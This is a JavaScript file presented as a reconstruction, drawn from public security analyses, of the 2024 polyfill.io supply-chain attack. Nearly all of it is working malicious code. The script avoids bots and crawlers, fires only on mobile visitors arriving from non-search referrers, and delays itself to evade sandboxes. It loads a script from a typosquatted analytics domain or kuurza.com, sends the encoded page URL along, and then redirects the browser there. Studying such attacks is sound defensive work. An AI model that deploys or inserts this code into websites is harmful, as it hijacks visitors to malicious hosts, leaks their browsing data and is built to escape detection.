// polyfill.io — reconstructed from public security analyses
// Source: https://sansec.io/research/polyfill-supply-chain-attack
//
// June 2024: Chinese company Funnull acquired polyfill.io domain and injected
// malicious redirects into the CDN script served to 100K+ websites.
// Mobile-only targeting with referrer checks to avoid detection by researchers.
//
// Technique: CDN supply chain + conditional redirect + mobile targeting + obfuscation

(function() {
  // Anti-analysis: only trigger on real browsers, not bots/crawlers
  function isBot() {
    var ua = navigator.userAgent.toLowerCase();
    return /bot|crawler|spider|google|bing|yahoo|semrush|ahrefs/.test(ua);
  }

  // Mobile-only targeting to reduce detection surface
  function isMobile() {
    return /android|iphone|ipad|mobile/i.test(navigator.userAgent);
  }

  // Referrer-based targeting: only activate from specific referring sites
  function hasValidReferrer() {
    var ref = document.referrer;
    return ref && !/google|bing|yahoo|duckduck/.test(ref.toLowerCase());
  }

  // Generate redirect URL with tracking params
  function getRedirectUrl() {
    var domains = [
      "www.googie-anaiytics.com",  // typosquat of Google Analytics
      "kuurza.com"                  // actual malicious domain from reports
    ];
    var domain = domains[Math.floor(Math.random() * domains.length)];
    var tid = btoa(window.location.href);
    return "https://" + domain + "/redirect?tid=" + encodeURIComponent(tid);
  }

  // Delayed execution to evade sandbox analysis
  function execute() {
    if (isBot()) return;
    if (!isMobile()) return;
    if (!hasValidReferrer()) return;

    // Dynamic script injection for redirect
    var script = document.createElement("script");
    script.src = getRedirectUrl();
    document.head.appendChild(script);

    // Fallback: meta refresh redirect after delay
    setTimeout(function() {
      var url = getRedirectUrl();
      window.location.href = url;
    }, 3000);
  }

  // Only run after page has fully loaded (evasion technique)
  if (document.readyState === "complete") {
    setTimeout(execute, 1000);
  } else {
    window.addEventListener("load", function() {
      setTimeout(execute, 1000);
    });
  }
})();
